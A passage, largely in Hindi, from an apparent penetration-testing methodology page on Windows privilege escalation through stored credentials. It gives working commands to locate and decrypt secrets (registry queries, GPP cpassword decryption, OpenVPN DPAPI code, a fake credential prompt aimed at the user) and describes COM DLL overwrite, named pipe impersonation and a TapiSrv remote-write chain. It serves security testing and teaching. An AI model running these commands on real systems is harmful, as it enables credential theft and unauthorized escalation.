reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY एक अलग session manager है। इसका native encrypted store `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` पर हो सकता है, जबकि exported session backup का नाम `sessions-backup.dat` हो सकता है और वह कहीं और store किया जा सकता है। [SolarWinds की export guide](https://thwack.solarwinds.com/discussion/comment/115591) के अनुसार exports password-encrypted होते हैं और उनमें sessions, keys, scripts, tags और relationships हो सकते हैं; इसका [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) native store की पहचान करता है। पहले file permissions और paths जाँचें। इनमें से कोई file मिलने से उसका password पता नहीं चलता और न ही यह साबित होता है कि कोई saved credential अब भी valid है या उसके पास अधिक privileges हैं।

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry में SSH keys

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` में स्टोर किया जा सकता है, इसलिए जाँचें कि उसमें कुछ दिलचस्प है या नहीं:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

यदि आपको उस path के अंदर कोई entry मिले, तो वह संभवतः saved SSH key होगी। यह encrypted रूप में stored होती है, लेकिन इसे [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके आसानी से decrypt किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

यदि `ssh-agent` service नहीं चल रही है और आप चाहते हैं कि यह boot पर अपने आप start हो, तो चलाएँ:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> ऐसा लगता है कि यह technique अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के ज़रिए किसी मशीन में लॉगिन करने की कोशिश की। Registry HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### Unattended फ़ाइलें

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM और SYSTEM बैकअप

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Readable Windows Imaging (`.wim`) बैकअप फ़ाइलों में ऑफलाइन `SAM`, `SECURITY`, और `SYSTEM` हाइव भी हो सकते हैं। पहले स्थानीय रूप से उपलब्ध बैकअप या इमेज डायरेक्टरी देखें और कुछ भी निकालने से पहले इमेज के **member names** की जाँच करें; केवल `.wim` फ़ाइल नाम से यह साबित नहीं होता कि हाइव मौजूद हैं, और सामान्य `install.wim`, `boot.wim`, तथा recovery images अक्सर गलत संकेत होते हैं। SMB share एक अलग access path है और उसकी जाँच केवल तभी करें, जब वह share scope में हो। Microsoft की [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) और [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) देखें।

### क्लाउड क्रेडेंशियल्स

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** नाम की फ़ाइल खोजें

### Cached GPP Password

पहले एक ऐसी सुविधा उपलब्ध थी, जो Group Policy Preferences (GPP) के ज़रिए मशीनों के एक समूह पर custom local administrator accounts deploy करने देती थी। हालाँकि, इस तरीके में सुरक्षा से जुड़ी गंभीर खामियाँ थीं। पहली, SYSVOL में XML फ़ाइलों के रूप में संग्रहीत Group Policy Objects (GPOs) को कोई भी domain user access कर सकता था। दूसरी, इन GPPs में मौजूद passwords AES256 से encrypt किए गए थे और इसके लिए सार्वजनिक रूप से दस्तावेज़ीकृत default key इस्तेमाल की गई थी, इसलिए कोई भी authenticated user उन्हें decrypt कर सकता था। इससे गंभीर जोखिम पैदा हुआ, क्योंकि उपयोगकर्ता elevated privileges हासिल कर सकते थे।

इस जोखिम को कम करने के लिए, एक ऐसा function विकसित किया गया जो locally cached GPP files को scan करके उनमें ऐसा "cpassword" field खोजता है जो खाली न हो। ऐसी फ़ाइल मिलने पर, function password को decrypt करता है और एक custom PowerShell object लौटाता है। इस object में GPP और फ़ाइल की location की जानकारी शामिल होती है, जिससे इस सुरक्षा vulnerability की पहचान और उसका समाधान करने में मदद मिलती है।

इन फ़ाइलों को `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword decrypt करने के लिए:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

credentials वाले web.config का उदाहरण:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot में Backup archives

Served webroot में सीधे रखा गया पुराना ZIP backup, पिछली configuration files और दोबारा इस्तेमाल किए जा सकने वाले credentials उजागर कर सकता है। इसे exposure मानने से पहले साइट का configured physical path जांचें और पुष्टि करें कि archive HTTP के ज़रिए वास्तव में accessible है या नहीं। डिफ़ॉल्ट `C:\inetpub\wwwroot` path सिर्फ़ एक संभावित जगह है। एक त्वरित local inventory, archives खोले बिना, उनके नाम और आकार सूचीबद्ध कर सकती है:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

किसी archive के नाम से यह साबित नहीं होता कि उसमें कोई secret है या बरामद credential से उच्चतर privilege मिलता है।

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### लॉग્સ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Credentials के लिए पूछें

अगर आपको लगता है कि उपयोगकर्ता को वे पता हो सकते हैं, तो आप हमेशा **उपयोगकर्ता से उसके credentials या किसी दूसरे उपयोगकर्ता के credentials दर्ज करने के लिए कह सकते हैं** (ध्यान दें कि क्लाइंट से सीधे **credentials** माँगना वास्तव में **जोखिम भरा** है):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **credentials वाली संभावित फ़ाइलों के नाम**

ज्ञात फ़ाइलें जिनमें पहले कभी **passwords** **clear-text** या **Base64** में मौजूद थे

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe extension के बिना filename-list variant

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 databases में आम तौर पर `.psafe3` extension का इस्तेमाल होता है। मेल खाने वाले filename को encrypted vault का संभावित संकेत मानें; इसकी मौजूदगी से यह साबित नहीं होता कि आप इसे पढ़ सकते हैं, unlock कर सकते हैं या इसमें stored credentials का इस्तेमाल कर सकते हैं। ऐसी files कहाँ stored हैं, इसकी समीक्षा करते समय accessible user profiles और configured file-sharing roots जाँचें।

पढ़ने योग्य KeePass `.kdbx` भी केवल encrypted-vault का संकेत है। इसे unlock करने के लिए वास्तविक master-password और कोई भी configured key-file या account factors आवश्यक हैं। यदि authorized review में किसी entry में LM:NT hash pair मिले, तो [pass-the-hash](../ntlm/README.md#pass-the-hash) पर विचार करने से पहले named account और यह जाँचें कि NT hash मौजूदा है और target की NTLM service इसे स्वीकार करती है या नहीं। Vault की entry अपने आप Administrator या SYSTEM rights नहीं देती; remote service access, account rights और service-execution का कोई अलग step भी आवश्यक है। Inventory में vault path और readability की जानकारी दें, database या stored credentials प्रिंट न करें।

प्रस्तावित सभी files खोजें:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe extension के बिना Search-command variant

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin में credentials

आपको credentials खोजने के लिए Bin भी देखना चाहिए।

हटाए गए backups और configuration archives के साथ-साथ ऐसी फ़ाइलों के लिए भी, जिनके नाम में स्पष्ट रूप से credentials का उल्लेख हो, सुलभ Recycle Bin entries जाँचें। किसी उपयोगी `.7z`, `.zip` या `.rar` backup को हटाए हुए महीनों हो सकते हैं और उसका फ़ाइलनाम साधारण हो सकता है। Windows मूल path और हटाए जाने का समय `$I` record में, और हटाई गई फ़ाइल को उससे जुड़ी `$R` entry के रूप में रखता है; archive खोलने से पहले metadata और मौजूदा identity की read access जाँचें। क्या दिखेगा, यह volume, user SID और file permissions पर निर्भर करता है, इसलिए खाली listing इस बात का प्रमाण नहीं है कि कोई recoverable backup मौजूद नहीं है। Archive के नाम को जाँचने लायक मानें, इस बात का प्रमाण नहीं कि उसमें कोई मान्य secret है।

सुलभ हटाई गई `.pfx` फ़ाइल **code-signing** के लिए उपयोगी सुराग भी हो सकती है। अगर उसमें सुलभ private key है, तो उस key से बदली हुई PowerShell script पर हस्ताक्षर किए जा सकते हैं; [PowerShell के लिए private key वाला code-signing certificate आवश्यक है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), और [AppLocker publisher rules, signer की पहचान और rule scope का मूल्यांकन करते हैं](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)। अलग-अलग accounts के बीच execution के लिए मौजूदा identity के पास ठीक उसी script को बदलने की अनुमति होनी चाहिए, लागू rule को उस script और target account के लिए बनी signature स्वीकार करनी चाहिए, और कोई scheduled task या अन्य higher-privilege consumer वास्तव में उसे चलाता हो। केवल `.pfx` filename, certificate subject या writable script होने से यह पूरी श्रृंखला साबित नहीं होती। Private-key सामग्री खोलने या task चलाने से पहले metadata, ACLs, policy और scheduled command की समीक्षा करें।

Credential के सुरागों के लिए सुलभ messaging-client profile databases, notes और प्राप्त फ़ाइलों की भी समीक्षा करें। BitLocker recovery export HTML या TXT के रूप में, कभी-कभी नाम वाले backup archive के भीतर, संग्रहीत हो सकता है। ऐसी सामग्री किसी अलग encrypted data volume तक पहुँच दे सकती है, जिसमें पुराने backups हों; volume और archive की जाँच केवल तभी करें जब इसकी अनुमति हो। अगर backup में `NTDS.dit` शामिल है, तो offline domain credential recovery के लिए उससे मेल खाने वाला `SYSTEM` hive भी आवश्यक है, जैसा कि [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md) में बताया गया है। केवल फ़ाइलनाम और locked volume से यह साबित नहीं होता कि कोई उपयोगी recovery key या domain backup मौजूद है।

कई प्रोग्रामों में सहेजे गए **पासवर्ड recover** करने के लिए आप इसका इस्तेमाल कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**Credentials वाली अन्य संभावित registry keys**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

जांचें कि **Chrome या Firefox** के पासवर्ड कहां संग्रहीत हैं।\
जांचें कि **Chrome, Edge या Firefox** के पासवर्ड कहां संग्रहीत हैं।\
ब्राउज़रों का इतिहास, बुकमार्क और पसंदीदा भी जांचें; हो सकता है कि उनमें कुछ **पासवर्ड संग्रहीत हों**।

वर्तमान उपयोगकर्ता के सामान्य Edge **Default** प्रोफ़ाइल के लिए, `Login Data` `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` में होता है, जबकि `Local State` इसकी पैरेंट `User Data` डायरेक्टरी में होता है। [Microsoft डिफ़ॉल्ट प्रोफ़ाइल का स्थान दस्तावेज़ित करता है](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); किसी अन्य प्रोफ़ाइल या `UserDataDir` नीति से इसका स्थान बदल सकता है। फ़ाइलें मौजूद होना केवल credential store का सुराग है: पुष्टि करें कि फ़ाइलें पढ़ी जा सकती हैं, संबंधित उपयोगकर्ता का DPAPI context या अन्य अधिकृत key material उपलब्ध है, और सहेजा गया login किसी अधिक privileged खाते का है या नहीं। केवल paths की सूची बनाने के लिए database खोलने या decrypted passwords दिखाने की आवश्यकता नहीं है।

Firefox के लिए, [Mozilla के दस्तावेज़ के अनुसार](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), प्रोफ़ाइल की `key4.db` और `logins.json` फ़ाइलें, क्रमशः key और encrypted-login फ़ाइलों की जोड़ी हैं। इनका मौजूद होना केवल एक सुराग है: जांचें कि दोनों फ़ाइलें पढ़ी जा सकती हैं या नहीं, सहेजी गई entries मौजूद हैं या नहीं, और यह निष्कर्ष निकालने से पहले कि credentials इस्तेमाल किए जा सकते हैं या नहीं, क्या Primary Password key को सुरक्षित रखता है। अगर प्राप्त credential किसी domain खाते का है, तो उस खाते के प्रभावी group-control अधिकारों और समूह के [LAPS password पढ़ने या decrypt करने के अधिकारों](../active-directory-methodology/laps.md) की अलग-अलग समीक्षा करें; केवल browser artifacts से administrator तक पहुंच का रास्ता साबित नहीं होता।

ब्राउज़रों से passwords निकालने के tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में बनी एक technology है, जो अलग-अलग भाषाओं के software components के बीच **intercommunication** की अनुमति देती है। हर COM component की पहचान एक **class ID (CLSID)** से होती है और हर component एक या अधिक interfaces के जरिए functionality उपलब्ध कराता है, जिनकी पहचान interface IDs (IIDs) से होती है।

COM classes और interfaces क्रमशः registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** को merge करके बनाई जाती है।

इस registry के CLSIDs के भीतर child registry **InProcServer32** मिल सकती है, जिसमें एक **default value** होती है जो **DLL** की ओर इंगित करती है और **ThreadingModel** नाम की एक value होती है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single या Multi) या **Neutral** (Thread Neutral) हो सकती है।

![ब्राउज़र इतिहास - COM DLL Overwriting: इस registry के CLSIDs के भीतर child registry InProcServer32 मिल सकती है, जिसमें एक default value होती है जो DLL की ओर इंगित करती है और एक value...](<../../images/image (729).png>)

मूल रूप से, अगर आप निष्पादित होने वाली किसी भी **DLL को overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं, बशर्ते उस DLL को कोई दूसरा उपयोगकर्ता निष्पादित करे।

यह जानने के लिए कि attackers persistence mechanism के रूप में COM Hijacking का उपयोग कैसे करते हैं, देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **फ़ाइलों और registry में सामान्य password खोज**

**फ़ाइलों की सामग्री खोजें**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**किसी विशिष्ट फ़ाइल नाम वाली फ़ाइल खोजें**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Registry में key names और passwords खोजें**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### पासवर्ड खोजने वाले Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है। मैंने यह plugin victim के अंदर credentials खोजने वाले हर metasploit POST module को **automatically execute** करने के लिए बनाया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस page पर बताए गए पासवर्ड वाली सभी files को automatically खोजता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) किसी system से पासवर्ड निकालने के लिए एक और बेहतरीन tool है।

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई tools के **sessions**, **usernames** और **passwords** खोजता है जो यह data clear text में सहेजते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY और RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रही कोई process full access के साथ एक नई process खोलती है** (`OpenProcess()`)। वही process **कम privileges के साथ एक नई process भी बनाती है** (`CreateProcess()`), जो **main process के सभी खुले handles inherit करती है**।\
फिर, अगर आपके पास **कम privileges वाली process का full access** है, तो आप `OpenProcess()` से बनाई गई privileged process का **खुला handle प्राप्त** कर सकते हैं और **shellcode inject कर सकते हैं**।\
[इस vulnerability का पता लगाने और इसका फायदा उठाने के तरीके के बारे में अधिक जानकारी के लिए यह उदाहरण पढ़ें।](leaked-handle-exploitation.md)\
[विभिन्न permission levels (सिर्फ full access नहीं) के साथ inherit किए गए processes और threads के अधिक खुले handles को जांचने और उनका दुरुपयोग करने के तरीके की पूरी जानकारी के लिए यह **दूसरी पोस्ट पढ़ें**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, processes के बीच communication और data transfer की सुविधा देते हैं।

Windows में **Named Pipes** नाम की एक सुविधा है, जो असंबंधित processes को अलग-अलग networks पर भी data साझा करने देती है। यह client/server architecture जैसा है, जिसमें roles को **named pipe server** और **named pipe client** कहा जाता है।

जब कोई **client**, pipe के ज़रिए data भेजता है, तो pipe सेट अप करने वाला **server** **client की पहचान अपना सकता है**, बशर्ते उसके पास ज़रूरी **SeImpersonate** rights हों। जिस **privileged process** से आप नकल कर सकें, उसके pipe के ज़रिए communication करने की पहचान करके आप **ज़्यादा privileges हासिल कर सकते हैं**—जब वह process आपके बनाए pipe के साथ interact करे, तब उसकी पहचान अपनाकर। ऐसा attack करने के निर्देश [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकते हैं।

इसके अलावा, यह tool **Burp जैसे tool से named pipe communication intercept करने** देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool privescs खोजने के लिए सभी pipes की सूची देखने देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode में Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) को expose करती है। कोई remote authenticated client, mailslot-आधारित async event path का दुरुपयोग करके `ClientAttach` को `NETWORK SERVICE` द्वारा लिखी जा सकने वाली किसी भी मौजूदा file में मनमाना **4-byte write** करने के लिए इस्तेमाल कर सकता है। इसके बाद Telephony admin rights हासिल करके service के रूप में कोई arbitrary DLL load की जा सकती है। पूरा तरीका:

- `pszDomainUser` को किसी ऐसी मौजूदा path पर सेट करके `ClientAttach` करें जिस पर लिखा जा सकता हो → service उसे `CreateFileW(..., OPEN_EXISTING)` के ज़रिए खोलती है और async event writes के लिए इस्तेमाल करती है।
- हर event, `Initialize` से attacker-नियंत्रित `InitContext` को उस handle में लिखता है। `LRegisterRequestRecipient` (`Req_Func 61`) से line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` के तहत खुद को जोड़ें और reconnect करें। फिर किसी arbitrary DLL path के साथ `GetUIDllName` call करके `NETWORK SERVICE` के रूप में `TSPI_providerUIIdentify` execute करें।

अधिक जानकारी:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## विविध

### Windows में चल सकने वाली File Extensions

**[https://filesec.io/](https://filesec.io/)** पेज देखें।

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` को भेजे गए clickable Markdown links खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और मौजूदा user के रूप में attacker-नियंत्रित files execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Passwords के लिए Command Lines की निगरानी**

जब किसी user के रूप में shell मिलती है, तो scheduled tasks या अन्य processes execute हो रही हो सकती हैं, जो **command line में credentials पास करती हैं**। नीचे दी गई script हर दो सेकंड में process command lines capture करती है और मौजूदा स्थिति की पिछली स्थिति से तुलना करके कोई भी अंतर output करती है।

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
